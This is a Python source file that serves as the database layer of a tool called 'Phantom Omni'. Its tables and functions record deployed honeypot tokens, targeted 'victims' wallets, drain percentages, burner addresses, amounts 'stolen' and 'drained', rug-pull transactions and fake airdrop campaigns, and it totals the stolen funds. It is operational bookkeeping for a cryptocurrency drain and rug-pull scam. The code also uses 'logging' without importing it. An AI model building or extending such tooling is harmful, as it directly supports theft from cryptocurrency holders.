"""Phantom Omni — Database Layer

Handles all database operations for:
- Tokens (deployed honeypot tokens)
- Victims (targeted wallets)
- Transactions (all on-chain activity)
- Settings (admin preferences)
- Airdrops (pending and completed)
"""

from __future__ import annotations

import json
import sqlite3
import threading
import time
import os
from contextlib import contextmanager
from typing import Optional, Dict, Any, List

log = logging.getLogger("solo-metro.phantom.db")

# ================================================================
# DATABASE SETUP
# ================================================================

DB_PATH = os.getenv("PHANTOM_DB_PATH", "data/phantom.db")
_lock = threading.Lock()

_SCHEMA = """
-- Tokens table
CREATE TABLE IF NOT EXISTS phantom_tokens (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    address TEXT UNIQUE NOT NULL,
    name TEXT NOT NULL,
    symbol TEXT NOT NULL,
    chain TEXT NOT NULL DEFAULT 'BSC',
    supply INTEGER NOT NULL,
    threshold REAL NOT NULL,
    burner_address TEXT NOT NULL,
    drain_percent INTEGER DEFAULT 90,
    sweep_threshold REAL DEFAULT 5,
    description TEXT,
    image_url TEXT,
    deploy_tx TEXT,
    deployed_at REAL NOT NULL,
    status TEXT DEFAULT 'active',
    stolen REAL DEFAULT 0,
    victims INTEGER DEFAULT 0,
    total_volume REAL DEFAULT 0,
    rugged_at REAL,
    rug_tx TEXT,
    created_at REAL DEFAULT CURRENT_TIMESTAMP
);

-- Victims table
CREATE TABLE IF NOT EXISTS phantom_victims (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    token_address TEXT NOT NULL,
    wallet_address TEXT NOT NULL,
    fake_amount INTEGER NOT NULL,
    targeted_at REAL NOT NULL,
    drained BOOLEAN DEFAULT 0,
    drained_amount REAL DEFAULT 0,
    buy_amount REAL DEFAULT 0,
    buy_tx TEXT,
    created_at REAL DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (token_address) REFERENCES phantom_tokens(address)
);

-- Transactions table
CREATE TABLE IF NOT EXISTS phantom_transactions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    token_address TEXT NOT NULL,
    type TEXT NOT NULL,
    amount REAL NOT NULL,
    wallet_address TEXT,
    tx_hash TEXT,
    chain TEXT NOT NULL,
    timestamp REAL NOT NULL,
    details TEXT,
    created_at REAL DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (token_address) REFERENCES phantom_tokens(address)
);

-- Airdrops table
CREATE TABLE IF NOT EXISTS phantom_airdrops (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    token_address TEXT NOT NULL,
    amount_per_wallet INTEGER NOT NULL,
    max_claims INTEGER NOT NULL,
    claims INTEGER DEFAULT 0,
    expires_at REAL NOT NULL,
    message TEXT,
    active BOOLEAN DEFAULT 1,
    created_at REAL DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (token_address) REFERENCES phantom_tokens(address)
);

-- Airdrop claims table
CREATE TABLE IF NOT EXISTS phantom_airdrop_claims (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    airdrop_id INTEGER NOT NULL,
    wallet_address TEXT NOT NULL,
    claimed_at REAL NOT NULL,
    amount INTEGER NOT NULL,
    verified BOOLEAN DEFAULT 0,
    tx_hash TEXT,
    created_at REAL DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (airdrop_id) REFERENCES phantom_airdrops(id)
);

-- Settings table
CREATE TABLE IF NOT EXISTS phantom_settings (
    key TEXT PRIMARY KEY,
    value TEXT NOT NULL,
    updated_at REAL NOT NULL
);

-- Indexes
CREATE INDEX IF NOT EXISTS idx_phantom_tokens_status ON phantom_tokens(status);
CREATE INDEX IF NOT EXISTS idx_phantom_tokens_address ON phantom_tokens(address);
CREATE INDEX IF NOT EXISTS idx_phantom_victims_token ON phantom_victims(token_address);
CREATE INDEX IF NOT EXISTS idx_phantom_victims_wallet ON phantom_victims(wallet_address);
CREATE INDEX IF NOT EXISTS idx_phantom_transactions_token ON phantom_transactions(token_address);
CREATE INDEX IF NOT EXISTS idx_phantom_transactions_timestamp ON phantom_transactions(timestamp);
CREATE INDEX IF NOT EXISTS idx_phantom_airdrops_token ON phantom_airdrops(token_address);
CREATE INDEX IF NOT EXISTS idx_phantom_airdrops_active ON phantom_airdrops(active);
"""

# Column migrations (add if missing)
_COLUMN_MIGRATIONS = [
    ("phantom_tokens", "sweep_threshold", "REAL DEFAULT 5"),
    ("phantom_tokens", "total_volume", "REAL DEFAULT 0"),
    ("phantom_tokens", "image_url", "TEXT"),
    ("phantom_victims", "buy_amount", "REAL DEFAULT 0"),
    ("phantom_victims", "buy_tx", "TEXT"),
    ("phantom_transactions", "chain", "TEXT DEFAULT 'BSC'"),
    ("phantom_airdrops", "active", "BOOLEAN DEFAULT 1"),
]


# ================================================================
# DATABASE CONNECTION
# ================================================================

def _ensure_db_dir():
    """Ensure the data directory exists."""
    db_dir = os.path.dirname(DB_PATH)
    if db_dir and not os.path.exists(db_dir):
        os.makedirs(db_dir, exist_ok=True)


@contextmanager
def connect():
    """Get a database connection."""
    _ensure_db_dir()
    with _lock:
        con = sqlite3.connect(DB_PATH, timeout=30)
        con.row_factory = sqlite3.Row
        con.execute("PRAGMA journal_mode=WAL")
        con.execute("PRAGMA synchronous=NORMAL")
        con.execute("PRAGMA foreign_keys=ON")
        try:
            yield con
            con.commit()
        except Exception:
            con.rollback()
            raise
        finally:
            con.close()


def init_db():
    """Initialize the database schema."""
    with connect() as con:
        con.executescript(_SCHEMA)
        
        # Apply column migrations
        for table, column, definition in _COLUMN_MIGRATIONS:
            try:
                existing = {row[1] for row in con.execute(f"PRAGMA table_info({table})").fetchall()}
                if column not in existing:
                    con.execute(f"ALTER TABLE {table} ADD COLUMN {column} {definition}")
                    log.info(f"Added column {column} to {table}")
            except Exception as e:
                log.warning(f"Migration failed for {table}.{column}: {e}")
        
        # Create default settings if not exists
        con.execute(
            "INSERT OR IGNORE INTO phantom_settings (key, value, updated_at) VALUES (?, ?, ?)",
            ("version", "1.0", time.time())
        )
        con.execute(
            "INSERT OR IGNORE INTO phantom_settings (key, value, updated_at) VALUES (?, ?, ?)",
            ("created_at", str(time.time()), time.time())
        )


# ================================================================
# TOKEN OPERATIONS
# ================================================================

def save_token(token_data: Dict[str, Any]) -> int:
    """Save a token to the database."""
    with connect() as con:
        cur = con.execute("""
            INSERT INTO phantom_tokens (
                address, name, symbol, chain, supply, threshold,
                burner_address, drain_percent, sweep_threshold,
                description, image_url, deploy_tx, deployed_at,
                status, stolen, victims, total_volume
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            token_data.get("address"),
            token_data.get("name"),
            token_data.get("symbol"),
            token_data.get("chain", "BSC"),
            token_data.get("supply", 1000000000),
            token_data.get("threshold", 10),
            token_data.get("burner_address"),
            token_data.get("drain_percent", 90),
            token_data.get("sweep_threshold", 5),
            token_data.get("description", ""),
            token_data.get("image_url", ""),
            token_data.get("deploy_tx", ""),
            token_data.get("deployed_at", time.time()),
            token_data.get("status", "active"),
            token_data.get("stolen", 0.0),
            token_data.get("victims", 0),
            token_data.get("total_volume", 0.0)
        ))
        return cur.lastrowid


def get_token(address: str) -> Optional[Dict[str, Any]]:
    """Get a token by address."""
    with connect() as con:
        row = con.execute(
            "SELECT * FROM phantom_tokens WHERE address = ?",
            (address.lower(),)
        ).fetchone()
        return dict(row) if row else None


def list_tokens(status: str = None, limit: int = 100) -> List[Dict[str, Any]]:
    """List tokens, optionally filtered by status."""
    with connect() as con:
        if status:
            rows = con.execute(
                "SELECT * FROM phantom_tokens WHERE status = ? ORDER BY id DESC LIMIT ?",
                (status, limit)
            ).fetchall()
        else:
            rows = con.execute(
                "SELECT * FROM phantom_tokens ORDER BY id DESC LIMIT ?",
                (limit,)
            ).fetchall()
        return [dict(r) for r in rows]


def update_token(address: str, updates: Dict[str, Any]) -> bool:
    """Update a token."""
    if not updates:
        return True
    
    fields = []
    values = []
    for key, val in updates.items():
        fields.append(f"{key} = ?")
        values.append(val)
    
    values.append(address.lower())
    
    with connect() as con:
        con.execute(
            f"UPDATE phantom_tokens SET {', '.join(fields)} WHERE address = ?",
            values
        )
        return True


def delete_token(address: str) -> bool:
    """Delete a token (and all associated data)."""
    with connect() as con:
        con.execute("DELETE FROM phantom_victims WHERE token_address = ?", (address.lower(),))
        con.execute("DELETE FROM phantom_transactions WHERE token_address = ?", (address.lower(),))
        con.execute("DELETE FROM phantom_tokens WHERE address = ?", (address.lower(),))
        return True


# ================================================================
# VICTIM OPERATIONS
# ================================================================

def save_victim(victim_data: Dict[str, Any]) -> int:
    """Save a victim to the database."""
    with connect() as con:
        cur = con.execute("""
            INSERT INTO phantom_victims (
                token_address, wallet_address, fake_amount,
                targeted_at, drained, drained_amount
            ) VALUES (?, ?, ?, ?, ?, ?)
        """, (
            victim_data.get("token_address"),
            victim_data.get("wallet_address"),
            victim_data.get("fake_amount", 0),
            victim_data.get("targeted_at", time.time()),
            1 if victim_data.get("drained", False) else 0,
            victim_data.get("drained_amount", 0.0)
        ))
        return cur.lastrowid


def get_victims(token_address: str, limit: int = 100) -> List[Dict[str, Any]]:
    """Get all victims for a token."""
    with connect() as con:
        rows = con.execute(
            "SELECT * FROM phantom_victims WHERE token_address = ? ORDER BY id DESC LIMIT ?",
            (token_address.lower(), limit)
        ).fetchall()
        return [dict(r) for r in rows]


def get_victim(wallet_address: str, token_address: str = None) -> Optional[Dict[str, Any]]:
    """Get a victim by wallet address."""
    with connect() as con:
        if token_address:
            row = con.execute(
                "SELECT * FROM phantom_victims WHERE wallet_address = ? AND token_address = ?",
                (wallet_address.lower(), token_address.lower())
            ).fetchone()
        else:
            row = con.execute(
                "SELECT * FROM phantom_victims WHERE wallet_address = ? ORDER BY id DESC LIMIT 1",
                (wallet_address.lower(),)
            ).fetchone()
        return dict(row) if row else None


def update_victim(victim_id: int, updates: Dict[str, Any]) -> bool:
    """Update a victim."""
    if not updates:
        return True
    
    fields = []
    values = []
    for key, val in updates.items():
        fields.append(f"{key} = ?")
        values.append(val)
    
    values.append(victim_id)
    
    with connect() as con:
        con.execute(
            f"UPDATE phantom_victims SET {', '.join(fields)} WHERE id = ?",
            values
        )
        return True


def delete_victim(victim_id: int) -> bool:
    """Delete a victim."""
    with connect() as con:
        con.execute("DELETE FROM phantom_victims WHERE id = ?", (victim_id,))
        return True


def count_victims(token_address: str) -> int:
    """Count victims for a token."""
    with connect() as con:
        row = con.execute(
            "SELECT COUNT(*) AS n FROM phantom_victims WHERE token_address = ?",
            (token_address.lower(),)
        ).fetchone()
        return row["n"] if row else 0


def get_total_drained(token_address: str = None) -> float:
    """Get total drained for a token or all tokens."""
    with connect() as con:
        if token_address:
            row = con.execute(
                "SELECT COALESCE(SUM(drained_amount), 0) AS total FROM phantom_victims WHERE token_address = ?",
                (token_address.lower(),)
            ).fetchone()
        else:
            row = con.execute(
                "SELECT COALESCE(SUM(drained_amount), 0) AS total FROM phantom_victims"
            ).fetchone()
        return row["total"] if row else 0.0


# ================================================================
# TRANSACTION OPERATIONS
# ================================================================

def save_transaction(tx_data: Dict[str, Any]) -> int:
    """Save a transaction to the database."""
    with connect() as con:
        cur = con.execute("""
            INSERT INTO phantom_transactions (
                token_address, type, amount, wallet_address,
                tx_hash, chain, timestamp, details
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            tx_data.get("token_address"),
            tx_data.get("type"),
            tx_data.get("amount", 0.0),
            tx_data.get("wallet_address", ""),
            tx_data.get("tx_hash", ""),
            tx_data.get("chain", "BSC"),
            tx_data.get("timestamp", time.time()),
            json.dumps(tx_data.get("details", {}))
        ))
        return cur.lastrowid


def get_transactions(
    token_address: str = None,
    limit: int = 100,
    since: float = None
) -> List[Dict[str, Any]]:
    """Get transactions, optionally filtered."""
    with connect() as con:
        if token_address and since:
            rows = con.execute(
                "SELECT * FROM phantom_transactions WHERE token_address = ? AND timestamp > ? ORDER BY id DESC LIMIT ?",
                (token_address.lower(), since, limit)
            ).fetchall()
        elif token_address:
            rows = con.execute(
                "SELECT * FROM phantom_transactions WHERE token_address = ? ORDER BY id DESC LIMIT ?",
                (token_address.lower(), limit)
            ).fetchall()
        elif since:
            rows = con.execute(
                "SELECT * FROM phantom_transactions WHERE timestamp > ? ORDER BY id DESC LIMIT ?",
                (since, limit)
            ).fetchall()
        else:
            rows = con.execute(
                "SELECT * FROM phantom_transactions ORDER BY id DESC LIMIT ?",
                (limit,)
            ).fetchall()
        
        result = []
        for r in rows:
            d = dict(r)
            if d.get("details"):
                try:
                    d["details"] = json.loads(d["details"])
                except:
                    d["details"] = {}
            result.append(d)
        return result


# ================================================================
# AIRDROP OPERATIONS
# ================================================================

def save_airdrop(airdrop_data: Dict[str, Any]) -> int:
    """Save an airdrop to the database."""
    with connect() as con:
        cur = con.execute("""
            INSERT INTO phantom_airdrops (
                token_address, amount_per_wallet, max_claims,
                expires_at, message, active
            ) VALUES (?, ?, ?, ?, ?, ?)
        """, (
            airdrop_data.get("token_address"),
            airdrop_data.get("amount_per_wallet", 0),
            airdrop_data.get("max_claims", 100),
            airdrop_data.get("expires_at", time.time() + 86400 * 7),
            airdrop_data.get("message", ""),
            1 if airdrop_data.get("active", True) else 0
        ))
        return cur.lastrowid


def get_airdrops(active_only: bool = True) -> List[Dict[str, Any]]:
    """Get all airdrops."""
    with connect() as con:
        if active_only:
            rows = con.execute(
                "SELECT * FROM phantom_airdrops WHERE active = 1 AND expires_at > ? ORDER BY id DESC",
                (time.time(),)
            ).fetchall()
        else:
            rows = con.execute(
                "SELECT * FROM phantom_airdrops ORDER BY id DESC"
            ).fetchall()
        return [dict(r) for r in rows]


def get_airdrop(airdrop_id: int) -> Optional[Dict[str, Any]]:
    """Get an airdrop by ID."""
    with connect() as con:
        row = con.execute(
            "SELECT * FROM phantom_airdrops WHERE id = ?",
            (airdrop_id,)
        ).fetchone()
        return dict(row) if row else None


def update_airdrop(airdrop_id: int, updates: Dict[str, Any]) -> bool:
    """Update an airdrop."""
    if not updates:
        return True
    
    fields = []
    values = []
    for key, val in updates.items():
        fields.append(f"{key} = ?")
        values.append(val)
    
    values.append(airdrop_id)
    
    with connect() as con:
        con.execute(
            f"UPDATE phantom_airdrops SET {', '.join(fields)} WHERE id = ?",
            values
        )
        return True


def save_airdrop_claim(claim_data: Dict[str, Any]) -> int:
    """Save an airdrop claim."""
    with connect() as con:
        cur = con.execute("""
            INSERT INTO phantom_airdrop_claims (
                airdrop_id, wallet_address, claimed_at,
                amount, verified, tx_hash
            ) VALUES (?, ?, ?, ?, ?, ?)
        """, (
            claim_data.get("airdrop_id"),
            claim_data.get("wallet_address"),
            claim_data.get("claimed_at", time.time()),
            claim_data.get("amount", 0),
            1 if claim_data.get("verified", False) else 0,
            claim_data.get("tx_hash", "")
        ))
        
        # Increment claims count on airdrop
        con.execute(
            "UPDATE phantom_airdrops SET claims = claims + 1 WHERE id = ?",
            (claim_data.get("airdrop_id"),)
        )
        
        return cur.lastrowid


def get_airdrop_claims(airdrop_id: int) -> List[Dict[str, Any]]:
    """Get claims for an airdrop."""
    with connect() as con:
        rows = con.execute(
            "SELECT * FROM phantom_airdrop_claims WHERE airdrop_id = ? ORDER BY id DESC",
            (airdrop_id,)
        ).fetchall()
        return [dict(r) for r in rows]


def has_claimed_airdrop(airdrop_id: int, wallet_address: str) -> bool:
    """Check if a wallet has claimed an airdrop."""
    with connect() as con:
        row = con.execute(
            "SELECT 1 FROM phantom_airdrop_claims WHERE airdrop_id = ? AND wallet_address = ?",
            (airdrop_id, wallet_address.lower())
        ).fetchone()
        return row is not None


# ================================================================
# SETTINGS OPERATIONS
# ================================================================

def get_setting(key: str, default: Any = None) -> Any:
    """Get a setting."""
    with connect() as con:
        row = con.execute(
            "SELECT value FROM phantom_settings WHERE key = ?",
            (key,)
        ).fetchone()
        if not row:
            return default
        
        # Try to parse JSON
        try:
            return json.loads(row["value"])
        except:
            return row["value"]


def set_setting(key: str, value: Any) -> None:
    """Set a setting."""
    if not isinstance(value, str):
        value = json.dumps(value)
    
    with connect() as con:
        con.execute("""
            INSERT OR REPLACE INTO phantom_settings (key, value, updated_at)
            VALUES (?, ?, ?)
        """, (key, value, time.time()))


def delete_setting(key: str) -> None:
    """Delete a setting."""
    with connect() as con:
        con.execute("DELETE FROM phantom_settings WHERE key = ?", (key,))


# ================================================================
# STATISTICS
# ================================================================

def get_stats() -> Dict[str, Any]:
    """Get overall statistics."""
    with connect() as con:
        total_tokens = con.execute("SELECT COUNT(*) AS n FROM phantom_tokens").fetchone()["n"]
        active_tokens = con.execute("SELECT COUNT(*) AS n FROM phantom_tokens WHERE status = 'active'").fetchone()["n"]
        rugged_tokens = con.execute("SELECT COUNT(*) AS n FROM phantom_tokens WHERE status = 'rugged'").fetchone()["n"]
        
        total_victims = con.execute("SELECT COUNT(*) AS n FROM phantom_victims").fetchone()["n"]
        total_drained = con.execute("SELECT COALESCE(SUM(drained_amount), 0) AS total FROM phantom_victims").fetchone()["total"]
        total_stolen = con.execute("SELECT COALESCE(SUM(stolen), 0) AS total FROM phantom_tokens").fetchone()["total"]
        total_volume = con.execute("SELECT COALESCE(SUM(total_volume), 0) AS total FROM phantom_tokens").fetchone()["total"]
        
        total_tx = con.execute("SELECT COUNT(*) AS n FROM phantom_transactions").fetchone()["n"]
        
        active_airdrops = con.execute(
            "SELECT COUNT(*) AS n FROM phantom_airdrops WHERE active = 1 AND expires_at > ?",
            (time.time(),)
        ).fetchone()["n"]
    
    return {
        "total_tokens": total_tokens,
        "active_tokens": active_tokens,
        "rugged_tokens": rugged_tokens,
        "total_victims": total_victims,
        "total_drained": total_drained,
        "total_stolen": total_stolen,
        "total_volume": total_volume,
        "total_transactions": total_tx,
        "active_airdrops": active_airdrops
    }


# ================================================================
# INITIALIZATION
# ================================================================

def init_phantom_db():
    """Initialize the Phantom database."""
    init_db()
    log.info("Phantom database initialized")